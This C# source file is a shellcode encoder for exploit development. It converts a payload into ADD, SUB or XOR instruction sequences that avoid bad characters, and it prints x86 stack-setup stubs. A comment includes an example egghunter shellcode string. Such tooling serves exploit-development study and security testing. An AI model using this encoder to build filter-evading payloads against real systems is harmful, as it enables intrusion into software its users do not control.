using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using asm.encoder.Encoders;

namespace asm.encoder
{
    /* CLI Example:
     -source \x00\x00\x00\x00 
     -target \x90\x90\x90\x90\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x70\x65\x65\x70\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7 
     -allowed \x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3b\x3c\x3d\x3e\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f 
     -add 
     -sub 
     -xor
     * */


    class Program
    {
        const string AddFlag = "-add";
        const string SubFlag = "-sub";
        const string XorFlag = "-xor";
        const string SourceFlag = "-source";
        const string TargetFlag = "-target";
        const string AllowedFlag = "-allowed";
        const string BadFlag = "-bad";

        static void ValidateArgs(string[] args, out byte[] sourceBytes, out byte[] targetBytes, out byte[] allowedBytes, out bool useAddEncoder, out bool useSubEncoder, out bool useXorEncoder)
        {
            string usageMessage = $"Usage: {nameof(asm.encoder)} -source <value> -target <value> [(-allowed | -bad) <value>] [-add | -sub | -xor]";
            string byteFormatMessage = $"<value> must be binary string format: \\x00\\x01\\x02";
            string sourceLengthMessage = $"-source <value> must be exactly 4 bytes";
            string targetLengthMessage = $"-target <value> must be a multiple of 4 bytes";

            if (args.Count() < 7)
            {
                throw new ArgumentException(usageMessage);
            }

            if (!args.Any(a => string.Equals(a, SourceFlag, StringComparison.OrdinalIgnoreCase)))
            {
                throw new ArgumentException(usageMessage);
            }

            if (!args.Any(a => string.Equals(a, TargetFlag, StringComparison.OrdinalIgnoreCase)))
            {
                throw new ArgumentException(usageMessage);
            }

            if (!args.Any(a => string.Equals(a, AllowedFlag, StringComparison.OrdinalIgnoreCase) ||
                               string.Equals(a, BadFlag, StringComparison.OrdinalIgnoreCase)))
            {
                throw new ArgumentException(usageMessage);
            }

            if (!args.Any(a => string.Equals(a, AddFlag, StringComparison.OrdinalIgnoreCase) ||
                                string.Equals(a, SubFlag, StringComparison.OrdinalIgnoreCase) ||
                                string.Equals(a, XorFlag, StringComparison.OrdinalIgnoreCase)))
            {
                throw new ArgumentException(usageMessage);
            }

            useAddEncoder = false;
            useSubEncoder = false;
            useXorEncoder = false;
            sourceBytes = null;
            targetBytes = null;
            allowedBytes = null;

            for (int i = 0; i < args.Length - 1; i++)
            {
                if (string.Equals(args[i], SourceFlag, StringComparison.OrdinalIgnoreCase))
                {
                    if (sourceBytes != null)
                    {
                        throw new ArgumentException(usageMessage);
                    }

                    string sourceData = args[i + 1];
                    try
                    {
                        sourceBytes = sourceData.Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();

                        if (sourceBytes.Length != 4)
                        {
                            throw new ArgumentException(sourceLengthMessage);
                        }
                    }
                    catch (Exception)
                    {
                        throw new ArgumentException(byteFormatMessage);
                    }
                }
                else if (string.Equals(args[i], TargetFlag, StringComparison.OrdinalIgnoreCase))
                {
                    if (targetBytes != null)
                    {
                        throw new ArgumentException(usageMessage);
                    }

                    string targetData = args[i + 1];
                    try
                    {
                        targetBytes = targetData.Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
                        if (targetBytes.Length % 4 != 0)
                        {
                            throw new ArgumentException(targetLengthMessage);
                        }
                    }
                    catch (Exception)
                    {
                        throw new ArgumentException(byteFormatMessage);
                    }
                }
                else if (string.Equals(args[i], AllowedFlag, StringComparison.OrdinalIgnoreCase))
                {
                    if (allowedBytes != null)
                    {
                        throw new ArgumentException(usageMessage);
                    }

                    string allowedData = args[i + 1];
                    try
                    {
                       allowedBytes = allowedData.Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
                    }
                    catch (Exception)
                    {
                        throw new ArgumentException(byteFormatMessage);
                    }
                }
                else if (string.Equals(args[i], BadFlag, StringComparison.OrdinalIgnoreCase))
                {
                    if (allowedBytes != null)
                    {
                        throw new ArgumentException(usageMessage);
                    }

                    string disallowedData = args[i + 1];
                    try
                    {
                        byte[] disallowedBytes = disallowedData.Split(new string[] { "\\x" }, StringSplitOptions.RemoveEmptyEntries).Select(b => byte.Parse(b, System.Globalization.NumberStyles.HexNumber)).ToArray();
                        allowedBytes = new byte[(byte.MaxValue + 1 - disallowedBytes.Length)];
                        int index = 0;
                        for (int byteValue = 0; byteValue < byte.MaxValue + 1; byteValue++)
                        {
                            if (!disallowedBytes.Any(bad => bad == (byte)byteValue))
                            {
                                allowedBytes[index++] = (byte)byteValue;
                            }
                        }
                    }
                    catch (Exception)
                    {
                        throw new ArgumentException(byteFormatMessage);
                    }
                }
                else if (string.Equals(args[i], AddFlag, StringComparison.OrdinalIgnoreCase))
                {
                    useAddEncoder = true;
                }
                else if (string.Equals(args[i], SubFlag, StringComparison.OrdinalIgnoreCase))
                {
                    useSubEncoder = true;
                }
                else if (string.Equals(args[i], XorFlag, StringComparison.OrdinalIgnoreCase))
                {
                    useXorEncoder = true;
                }
            }
        }

        static void SetupOption1()
        {
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption1)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine($"{"54",-20}; PUSH ESP");
            Console.WriteLine($"POP <REG>");
            Console.WriteLine($"ADD <REG>, <STACK_SPACE>");
            Console.WriteLine($"PUSH <REG>");
            Console.WriteLine($"{"5C",-20}; POP ESP");
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption1)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine(Environment.NewLine);
        }

        static void SetupOption2()
        {
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption2)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine($"-0x05: {"EB03",-20}; JMP 'CALL POP <REG>'");
            Console.WriteLine($"-0x03: POP <REG>");
            Console.WriteLine($"-0x02: PUSH <REG>");
            Console.WriteLine($"-0x01: {"C3",-20}; RETN");
            Console.WriteLine($"---->: {"E8F8FFFFFF",-20}; CALL 'POP <REG>'");
            Console.WriteLine($"OPTNL: MOV <REG2>, ESP; SAVE ESP FOR LATER RESTORE");
            Console.WriteLine($"+0x05: MOV ESP, <REG>");
            Console.WriteLine($"-0x07: ADD ESP, <STACK_SPACE>");
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption2)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine(Environment.NewLine);
        }

        static void SetupOption3()
        {
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption3)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine($"-0x04: {"EB02",-20}; JMP --> 'CALL'");
            Console.WriteLine($"-0x02: {"EB05",-20}; JMP --> 'POP <REG>'");
            Console.WriteLine($"---->: {"E8F8FFFFFF",-20}; CALL");
            Console.WriteLine($"OPTNL: MOV <REG2>, ESP; SAVE ESP FOR LATER RESTORE");
            Console.WriteLine($"+0x05: POP <REG>");
            Console.WriteLine($"+0x05: MOV ESP, <REG>");
            Console.WriteLine($"-0x07: ADD ESP, <STACK_SPACE>");
            Console.WriteLine($"{string.Empty.PadRight(20, '=')}{nameof(SetupOption3)}{string.Empty.PadRight(20, '=')}");
            Console.WriteLine(Environment.NewLine);
        }

        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine($"Endian Format: {(BitConverter.IsLittleEndian ? "LITTLE ENDIAN" : "BIG ENDIAN")}");
                Console.WriteLine($"When using this tool to find encoded ADD/SUB amount to increment register, input 'target' as LITTLE ENDIAN format.");

                ValidateArgs(args, out byte[] sourceBytes, out byte[] targetBytes, out byte[] allowedBytes, out bool useAddEncoder, out bool useSubEncoder, out bool useXorEncoder);

                SetupOption1();
                SetupOption2();
                SetupOption3();

                BaseEncoder addSubEncoder = null;
                BaseEncoder xorEncoder = null;

                if (useAddEncoder || useSubEncoder)
                {
                    addSubEncoder = new AddSubEncoder(allowedBytes);
                }
                if (useXorEncoder)
                {
                    xorEncoder = new XorEncoder(allowedBytes);
                }

                int encodedSize = 0;
                OpCode source = new OpCode(BitConverter.ToUInt32(sourceBytes, 0));
                for (int i = targetBytes.Length - 4; i >= 0; i -= 4)
                {
                    AsmEncoding addEncoding = null;
                    AsmEncoding subEncoding = null;
                    AsmEncoding xorEncoding = null;

                    OpCode target = new OpCode(BitConverter.ToUInt32(targetBytes, i));

                    if (useAddEncoder)
                    {
                        addEncoding = addSubEncoder.EncodeOperation(source, target, Operation.ADD);
                    }
                    if (useSubEncoder)
                    {
                        subEncoding = addSubEncoder.EncodeOperation(source, target, Operation.SUB);
                    }
                    if (useXorEncoder)
                    {
                        xorEncoding = xorEncoder.EncodeOperation(source, target, Operation.XOR);
                    }

                    AsmEncoding result = addEncoding;
                    if (subEncoding != null && (result == null || subEncoding.Transitions.Count < result.Transitions.Count))
                    {
                        result = subEncoding;
                    }
                    if (xorEncoding != null && (result == null || xorEncoding.Transitions.Count < result.Transitions.Count))
                    {
                        result = xorEncoding;
                    }

                    Console.WriteLine(result);
                    encodedSize += (result.Transitions.Count * 5) + 1; // 5 bytes per encoding step; 1 byte for push
                    source = target;
                }

                Console.WriteLine($"Total Size of Payload: {targetBytes.Length}: 0x{targetBytes.Length:X2}");
                Console.WriteLine($"Total Size of Encoded: {encodedSize}: 0x{encodedSize:X2}");
                Console.WriteLine($"Total stack space: {targetBytes.Length + encodedSize}: 0x{(targetBytes.Length + encodedSize):X2}");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return;
            }
        }
    }
}